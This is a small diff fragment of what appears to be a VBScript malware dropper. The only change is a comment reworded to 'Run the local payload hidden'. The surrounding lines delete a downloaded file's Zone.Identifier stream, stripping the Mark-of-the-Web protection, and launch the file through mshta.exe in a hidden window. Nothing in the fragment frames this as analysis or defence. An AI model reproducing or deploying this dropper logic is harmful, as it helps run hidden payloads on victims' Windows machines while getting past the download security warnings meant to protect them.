@@ -29,7 +29,7 @@ If xh.Status = 200 Then
     fso.DeleteFile path & ":Zone.Identifier", True
     On Error GoTo 0
     
-    ' Run the local payload
+    ' Run the local payload hidden
     sh.Run "mshta.exe """ & path & """", 0, False
 End If
 
